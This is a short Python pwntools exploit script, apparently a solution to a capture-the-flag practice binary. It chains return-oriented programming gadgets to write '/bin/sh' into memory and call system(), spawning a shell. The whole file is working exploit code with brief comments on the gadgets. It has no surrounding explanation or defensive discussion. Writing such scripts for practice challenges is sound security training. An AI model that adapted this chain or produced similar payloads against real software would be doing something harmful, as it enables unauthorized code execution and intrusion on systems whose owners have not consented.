from pwn import *

## r10 --> address
## r11 --> string

## 0x000000000040084c: pop r15; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
### 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
### 0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
### 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
### 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;

system = 0x4005e0
space = 0x601050 + 2

payload = "A" * 40

def write(string,offset):
    out = ""
    out += p64(0x400822) ##zero out r11
    out += "JUNKJUNK"
    out += p64(0x400832) ##sets address to r12
    out += offset
    out += p64(0x40082f) ##sets address from r12 to r11
    out += "JUNKJUNK"
    out += p64(0x400840) ##sets address to r10
    out += "JUNKJUNK"
    out += p64(0x400822) ##zero out r11
    out += "JUNKJUNK"
    out += p64(0x400832) ##sets string to r12
    out += string
    out += p64(0x40082f)  ##sets string from r12 to r11
    out += "JUNKJUNK"
    out += p64(0x40084c)
    out += "JUNKJUNK"
    out += "JUNKJUNK"
    out += p64(0x0)
    #out += p64(0x0)
    return out

payload += write("/bin/sh\x00",p64(space))
#payload += p64(0x400858)
payload += p64(0x04008c3)
payload += p64(space)
payload += p64(0x4007b4)
payload += p64(0x4005e0)
payload += "A" * 8
print payload
